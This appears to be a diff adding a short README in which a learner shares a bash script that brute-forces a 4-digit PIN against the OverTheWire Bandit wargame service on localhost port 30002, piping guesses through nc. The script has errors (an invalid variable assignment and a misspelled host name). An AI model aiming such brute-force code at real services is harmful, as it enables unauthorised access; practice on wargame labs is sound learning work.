@@ -1,0 +1,14 @@
+I am doing overthewire bandit and just created my first bruteforcer here is the code:
+
+#!/bin/bash
+
+password = "Not going to put the real password"
+
+{
+  for pin in $(seq -w 0000 9999); do 
+     echo "$password $pin"
+  done
+} | nc loaclhost 30002
+
+You can post your ideas/commenst in issues so let me know if it works and if you have any suggestions or projects to do next
+Bye iggythepiggy
